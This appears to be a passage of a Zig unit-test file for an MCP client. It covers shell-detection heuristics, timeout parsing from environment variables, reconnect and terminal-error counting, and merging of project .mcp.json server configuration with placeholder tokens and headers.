    // Leading FOO=bar env-prefix form needs a shell.
    try testing.expect(transportLooksShellLike("FOO=bar mycmd"));
    // A path containing '=' after the first '/' is not an env prefix.
    try testing.expect(!transportLooksShellLike("/opt/a=b/cmd arg"));
    // Empty/whitespace falls back to shell.
    try testing.expect(transportLooksShellLike("   "));
}

test "spawnStdioSessionFromTransport tokenizes a plain command string" {
    const allocator = testing.allocator;

    _ = setenv("FROM_PARENT_TT", "yes", 1);
    defer _ = unsetenv("FROM_PARENT_TT");

    // No shell metachars => tokenized + spawned directly, still inheriting
    // the parent env (so FROM_PARENT_TT is visible to the child via env, but
    // we run a command directly: print a fixed arg to prove tokenization).
    var session = try spawnStdioSessionFromTransport(
        allocator,
        "/bin/echo hello world",
        null,
    );
    const output = try readStdioSessionToEnd(allocator, &session);
    defer allocator.free(output);
    session.deinit();

    try testing.expectEqualStrings("hello world\n", output);
}

test "parseTimeoutMs: unset falls back to the default" {
    try testing.expectEqual(@as(u32, 30_000), parseTimeoutMs(null, DEFAULT_MCP_CONNECTION_TIMEOUT_MS));
    try testing.expectEqual(@as(u32, 100_000_000), parseTimeoutMs(null, DEFAULT_MCP_TOOL_TIMEOUT_MS));
}

test "parseTimeoutMs: a positive integer is honored" {
    try testing.expectEqual(@as(u32, 5000), parseTimeoutMs("5000", DEFAULT_MCP_CONNECTION_TIMEOUT_MS));
    // Surrounding whitespace is trimmed.
    try testing.expectEqual(@as(u32, 5000), parseTimeoutMs("  5000\n", DEFAULT_MCP_CONNECTION_TIMEOUT_MS));
}

test "parseTimeoutMs: non-numeric falls back to the default" {
    try testing.expectEqual(@as(u32, 30_000), parseTimeoutMs("abc", DEFAULT_MCP_CONNECTION_TIMEOUT_MS));
    try testing.expectEqual(@as(u32, 30_000), parseTimeoutMs("", DEFAULT_MCP_CONNECTION_TIMEOUT_MS));
    try testing.expectEqual(@as(u32, 30_000), parseTimeoutMs("12x", DEFAULT_MCP_CONNECTION_TIMEOUT_MS));
}

test "parseTimeoutMs: zero falls back to the default (reference parseInt || default)" {
    try testing.expectEqual(@as(u32, 30_000), parseTimeoutMs("0", DEFAULT_MCP_CONNECTION_TIMEOUT_MS));
}

test "parseTimeoutMs: a large tool timeout is honored and over-large clamps to u32 max" {
    try testing.expectEqual(@as(u32, 120_000), parseTimeoutMs("120000", DEFAULT_MCP_TOOL_TIMEOUT_MS));
    try testing.expectEqual(@as(u32, 100_000_000), parseTimeoutMs("100000000", DEFAULT_MCP_TOOL_TIMEOUT_MS));
    // A value beyond u32 max clamps rather than overflowing the downstream
    // i128 deadline math.
    try testing.expectEqual(std.math.maxInt(u32), parseTimeoutMs("99999999999999", DEFAULT_MCP_TOOL_TIMEOUT_MS));
}

test "rpcTimeoutMsForMethod: tools/call uses the tool budget, others the connection budget" {
    // Pin both env vars so the selection is deterministic regardless of the
    // ambient environment, and so this exercises the env-override wiring.
    _ = setenv("MCP_TIMEOUT", "7000", 1);
    defer _ = unsetenv("MCP_TIMEOUT");
    _ = setenv("MCP_TOOL_TIMEOUT", "123456", 1);
    defer _ = unsetenv("MCP_TOOL_TIMEOUT");

    // tools/call gets the (overridden) tool budget; every other method gets the
    // (overridden) connection budget.
    try testing.expectEqual(@as(u32, 123_456), rpcTimeoutMsForMethod("tools/call"));
    try testing.expectEqual(@as(u32, 7000), rpcTimeoutMsForMethod("initialize"));
    try testing.expectEqual(@as(u32, 7000), rpcTimeoutMsForMethod("tools/list"));
}

test "connectionTimeoutMs and toolTimeoutMs read their env vars with sane defaults" {
    // Defaults when unset.
    _ = unsetenv("MCP_TIMEOUT");
    _ = unsetenv("MCP_TOOL_TIMEOUT");
    try testing.expectEqual(@as(u32, 30_000), connectionTimeoutMs());
    try testing.expectEqual(@as(u32, 100_000_000), toolTimeoutMs());

    // Overridden values.
    _ = setenv("MCP_TIMEOUT", "5000", 1);
    defer _ = unsetenv("MCP_TIMEOUT");
    _ = setenv("MCP_TOOL_TIMEOUT", "120000", 1);
    defer _ = unsetenv("MCP_TOOL_TIMEOUT");
    try testing.expectEqual(@as(u32, 5000), connectionTimeoutMs());
    try testing.expectEqual(@as(u32, 120_000), toolTimeoutMs());
}

// -- mcp-13 reconnect / terminal-error tests --

/// Build a Client backed by a throwaway registry file under `tmp`. Caller frees
/// `registry_path` and deinits the returned client.
fn testClient(allocator: std.mem.Allocator, tmp: *testing.TmpDir) !struct { client: Client, registry_path: []u8 } {
    const dir = try @import("../core/test_helpers.zig").tmpDirCwd(allocator, tmp);
    defer allocator.free(dir);
    const registry_path = try std.fs.path.join(allocator, &.{ dir, "registry.json" });
    errdefer allocator.free(registry_path);
    const client = try Client.init(allocator, registry_path);
    return .{ .client = client, .registry_path = registry_path };
}

/// Insert a bare initialized HTTP session for `name` (no OS resources, safe to
/// fake) so the counter/clear paths can be exercised without a live server.
fn insertFakeHttpSession(client: *Client, name: []const u8) !void {
    const owned_key = try client.allocator.dupe(u8, name);
    errdefer client.allocator.free(owned_key);
    try client.http_sessions.put(client.allocator, owned_key, .{ .initialized = true });
}

test "three consecutive terminal errors force-close the session" {
    const allocator = testing.allocator;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var harness = try testClient(allocator, &tmp);
    defer harness.client.deinit();
    defer allocator.free(harness.registry_path);
    var client = &harness.client;

    try insertFakeHttpSession(client, "svc");
    try testing.expect(client.http_sessions.contains("svc"));

    // First two terminal errors only bump the counter; the session survives.
    try testing.expect(!client.noteHttpTerminalError("svc"));
    try testing.expect(client.http_sessions.contains("svc"));
    try testing.expect(!client.noteHttpTerminalError("svc"));
    try testing.expect(client.http_sessions.contains("svc"));

    // The third terminal error trips MAX_ERRORS_BEFORE_RECONNECT and the
    // session is force-closed (removed from the map entirely).
    try testing.expect(client.noteHttpTerminalError("svc"));
    try testing.expect(!client.http_sessions.contains("svc"));
}

test "a successful RPC resets the consecutive terminal-error counter" {
    const allocator = testing.allocator;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var harness = try testClient(allocator, &tmp);
    defer harness.client.deinit();
    defer allocator.free(harness.registry_path);
    var client = &harness.client;

    try insertFakeHttpSession(client, "svc");
    // Two terminal errors, then a reset (the success path), then two more must
    // NOT trip the threshold (counter went back to zero).
    try testing.expect(!client.noteHttpTerminalError("svc"));
    try testing.expect(!client.noteHttpTerminalError("svc"));
    client.resetTerminalErrorCounts("svc");
    try testing.expectEqual(@as(u8, 0), client.http_sessions.getPtr("svc").?.terminal_error_count);
    try testing.expect(!client.noteHttpTerminalError("svc"));
    try testing.expect(!client.noteHttpTerminalError("svc"));
    try testing.expect(client.http_sessions.contains("svc"));
}

test "reconnect clears any cached session for a server" {
    const allocator = testing.allocator;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var harness = try testClient(allocator, &tmp);
    defer harness.client.deinit();
    defer allocator.free(harness.registry_path);
    var client = &harness.client;

    try insertFakeHttpSession(client, "svc");
    try testing.expect(client.isConnected("svc"));
    client.reconnect("svc");
    try testing.expect(!client.isConnected("svc"));

    // reconnect is idempotent: clearing an absent session is a no-op.
    client.reconnect("svc");
    try testing.expect(!client.isConnected("svc"));
}

// --- Phase 6: scoped config drives live connections (mcp-01 / mcp-04 wiring) ---

test "scoped config: a project .mcp.json stdio server is merged into the client's connection set" {
    const allocator = testing.allocator;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();

    // A project `.mcp.json` declaring a structured stdio server (command + args
    // + env) and a legacy registry with one `mcp add`-style server. After the
    // scoped load both must appear in the merged set the client connects from,
    // and the stdio server must carry its structured command/args/env.
    try tmp.dir.writeFile(rt.io, .{
        .sub_path = ".mcp.json",
        .data =
        \\{ "mcpServers": {
        \\  "fs": { "command": "node", "args": ["server.js", "--port", "3000"], "env": { "TOKEN": "abc" } }
        \\} }
        ,
    });

    const project_dir = try @import("../core/test_helpers.zig").tmpDirPath(allocator, &tmp, ".");
    defer allocator.free(project_dir);
    const registry_path = try std.fs.path.join(allocator, &.{ project_dir, "registry.json" });
    defer allocator.free(registry_path);

    var client = try Client.init(allocator, registry_path);
    defer client.deinit();
    // Seed the legacy registry through the public `mcp add` path so its import
    // into the merged set is exercised too.
    try client.add("legacy", "python -m server");

    try client.loadScopedConfigForTest(project_dir);

    // The structured `.mcp.json` server is present with its structured fields.
    const fs_cfg = client.serverConfigFor("fs").?;
    try testing.expectEqual(mcp_config.TransportType.stdio, fs_cfg.type);
    try testing.expectEqual(mcp_config.ConfigScope.project, fs_cfg.scope);
    try testing.expectEqualStrings("node", fs_cfg.command.?);
    try testing.expectEqual(@as(usize, 3), fs_cfg.args.len);
    try testing.expectEqualStrings("--port", fs_cfg.args[1]);
    try testing.expectEqual(@as(usize, 1), fs_cfg.env.len);
    try testing.expectEqualStrings("TOKEN", fs_cfg.env[0].key);
    try testing.expectEqualStrings("abc", fs_cfg.env[0].value);

    // The legacy registry server survived the merge (imported at user scope).
    try testing.expect(client.serverConfigFor("legacy") != null);

    // `list()` (the connection-set view the suggestion path + `mcp list` read)
    // surfaces both servers, rendered back into the flat {name, transport} shape.
    client.scoped_enabled = true; // make list() prefer the loaded scoped set
    const servers = try client.list();
    defer freeServers(allocator, servers);
    var saw_fs = false;
    var saw_legacy = false;
    for (servers) |s| {
        if (std.mem.eql(u8, s.name, "fs")) {
            saw_fs = true;
            // The stdio server renders as `command arg arg ...`.
            try testing.expectEqualStrings("node server.js --port 3000", s.transport);
        }
        if (std.mem.eql(u8, s.name, "legacy")) saw_legacy = true;
    }
    try testing.expect(saw_fs and saw_legacy);
}

test "scoped config: resolved http headers reach the HTTP request builder" {
    const allocator = testing.allocator;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();

    // A project `.mcp.json` http server carrying a static header. After the
    // scoped load, the server's resolved headers (static + any dynamic helper)
    // must be the ones that flow into the curl header-line builder used by the
    // live HTTP path -- proving the mcp-04 header wiring is connected.
    try tmp.dir.writeFile(rt.io, .{
        .sub_path = ".mcp.json",
        .data =
        \\{ "mcpServers": {
        \\  "api": { "type": "http", "url": "https://api.example.com/mcp", "headers": { "X-Api-Key": "secret" } }
        \\} }
        ,
    });

    const project_dir = try @import("../core/test_helpers.zig").tmpDirPath(allocator, &tmp, ".");
    defer allocator.free(project_dir);
    const registry_path = try std.fs.path.join(allocator, &.{ project_dir, "registry.json" });
    defer allocator.free(registry_path);

    var client = try Client.init(allocator, registry_path);
    defer client.deinit();
    try client.loadScopedConfigForTest(project_dir);

    const api_cfg = client.serverConfigFor("api").?;
    try testing.expectEqual(mcp_config.TransportType.http, api_cfg.type);

    // Resolve the server's headers the same way the live structured HTTP path
    // does (non-interactive: the helper trust gate is bypassed; here there is no
    // helper, so this returns the static set).
    const resolved = try headers_helper.getMcpServerHeaders(allocator, api_cfg, .{ .interactive = false });
    defer headers_helper.freeHeaders(allocator, resolved);

    // Feed the resolved headers through the exact builder the live request path
    // uses and assert the config header is present in the final header lines.
    var lines = try buildHttpHeaderLines(allocator, null, null, null, resolved);
    defer {
        for (lines.items) |l| allocator.free(l);
        lines.deinit();
    }
    var saw_api_key = false;
    for (lines.items) |line| {
        if (std.mem.eql(u8, line, "X-Api-Key: secret")) saw_api_key = true;
    }
    try testing.expect(saw_api_key);
}
